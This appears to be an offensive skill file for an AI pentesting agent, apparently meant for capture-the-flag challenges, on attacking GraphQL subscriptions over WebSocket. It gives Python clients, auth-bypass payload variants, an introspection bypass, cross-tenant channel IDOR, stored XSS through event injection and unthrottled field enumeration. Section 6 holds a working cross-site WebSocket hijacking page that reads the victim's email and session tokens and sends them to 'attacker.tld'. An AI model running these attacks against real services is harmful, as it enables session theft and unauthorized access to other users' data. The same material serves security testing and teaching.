# Subscriptions — the WebSocket transport

GraphQL subscriptions run over WebSocket (graphql-ws / subscriptions-transport-ws
protocols). The WebSocket transport has its own authz model, its own parser,
and frequently **a different server instance** than the HTTP endpoint — with
different middleware. This file covers finding, speaking, and abusing the
subscription channel.

---

## 1. Finding the WS endpoint

```text
ws://$HOST/graphql            wss://$HOST/graphql
ws://$HOST/subscriptions      wss://$HOST/api/graphql
ws://$HOST/graphql-ws         wss://$HOST/ws
```

Detection signals:

- `subscriptionType` in introspection → subscriptions exist.
- HTTP endpoint answers `?query=subscription{...}` with a hint like
  `"subscriptions are only supported over websocket"`.
- JS bundle greps: `subscription`, `ws://`, `wss://`, `graphql-ws`,
  `subscriptions-transport-ws`, `createClient({url: 'ws` etc.
- HTTP `Upgrade` headers accepted on the endpoint.

## 2. The two protocols — which one speaks

**subscriptions-transport-ws** (legacy, Apollo):

```json
→ {"type":"connection_init","payload":{}}
← {"type":"connection_ack"}
→ {"id":"1","type":"start","payload":{"query":"subscription{notify}","variables":{}}}
← {"type":"data","id":"1","payload":{"data":{...}}}
```

**graphql-ws** (current):

```json
→ {"type":"connection_init","payload":{}}
← {"type":"connection_ack"}
→ {"id":"1","type":"subscribe","payload":{"query":"subscription{notify}"}}
← {"type":"next","id":"1","payload":{"data":{...}}}
```

`start`/`data` vs `subscribe`/`next` — the server's error tells you which it
expects.

Python client skeleton (websockets is installed per environment notes):

```python
import asyncio, json, websockets
async def run():
    async with websockets.connect("wss://target/graphql",
        subprotocols=["graphql-transport-ws","graphql-ws"]) as ws:
        await ws.send(json.dumps({"type":"connection_init","payload":{}}))
        print(await ws.recv())                      # ack
        await ws.send(json.dumps({"id":"1","type":"subscribe",
            "payload":{"query":"subscription{__typename}"}}))
        for _ in range(3):
            print(await ws.recv())
asyncio.run(run())
```

The **subprotocol** header matters — `graphql-transport-ws` (new) vs
`graphql-ws` (old). If handshake succeeds on neither, try both raw.

## 3. Auth on the WS channel — the gap

HTTP auth middleware often doesn't run on the upgrade path:

- `connection_init` **payload** carries the token:
  `{"type":"connection_init","payload":{"authToken":"..."}}` — some servers
  only check it there; **empty payload may still resolve queries**.
- Session cookie on the WS handshake — some stacks share it, some don't.
- Per-message authz: `connection_init` auth'd but each operation re-checks?
  Test: auth init → unauthorized subscription field.

```python
# auth payload variants
{"payload":{"authToken": TOK}}
{"payload":{"Authorization": f"Bearer {TOK}"}}
{"payload":{"headers":{"Authorization": f"Bearer {TOK}"}}}
{"payload":{}}                                   # no auth — try it
```

## 4. Queries over WS — the introspection bypass

The WS channel is often a **different code path** — introspection disabled
on HTTP may be enabled here:

```json
{"id":"1","type":"subscribe",
 "payload":{"query":"{__schema{types{name}}}"}}
```

Plain *queries* run over `subscribe` too — the WS protocol accepts query
documents, not just subscriptions. This is the **introspection bypass**:
`__schema` over WS frequently survives when HTTP kills it.

## 5. Subscription abuse patterns

- **Cross-tenant subscription**: `subscription{messageAdded(channel:"room:2")}`
  — subscribing to a channel/room you don't belong to. The `channel`/`room`
  arg is an IDOR surface — enumerates ids like `idor-graphql.md`.
- **Event injection**: if any mutation *emits* to a subscription, a hostile
  payload rides the event to other users' clients — stored XSS to all
  subscribers (`mutation{postMessage(text:"<script>...")}`).
- **Resource exhaustion**: one connection subscribing to N topics — bounded
  probe only (same caution as batching-attacks §8).
- **Message-level authz gap**: `connection_init` auth'd, then
  `subscription{adminEvents}` resolves — authz was init-only.

## 6. Cross-site WebSocket hijacking — CSWSH

WebSocket handshakes carry cookies. If the WS server doesn't check `Origin`:

```html
<script>
ws = new WebSocket("wss://victim.tld/graphql", "graphql-transport-ws");
ws.onopen = () => {
  ws.send('{"type":"connection_init","payload":{}}');
  ws.send('{"id":"1","type":"subscribe",
           "payload":{"query":"{me{email sessions{token}}}"}}');
};
ws.onmessage = m => fetch("//attacker.tld/?d="+btoa(m.data));
</script>
```

The browser sends the victim's session cookie with the handshake — queries
run as the victim and responses exfil. Check `Origin` enforcement: connect
from a page on a foreign origin — if `connection_ack` still comes, CSWSH is
live (`skills/web-websocket/` owns the class).

## 7. Message-level fuzzing inside one socket

The WS channel multiplexes N operations on one connection — free batching
without HTTP batching:

```python
for i, guess in enumerate(names):
    await ws.send(json.dumps({"id":str(i),"type":"subscribe",
        "payload":{"query":"{%s}"%guess}}))
```

Each `id` gets its own response — error messages per id discriminate
exists/not-exists. Same suggestion oracle, no rate limit.

## 8. Recording

```bash
python3 tools/state.py $CHAL --hypothesis \
  "WS endpoint live at /graphql — introspection enabled on socket, not HTTP"
```

The transport difference is the finding-capability; record it — next agent
may need the WS channel for a payload that HTTP refuses.
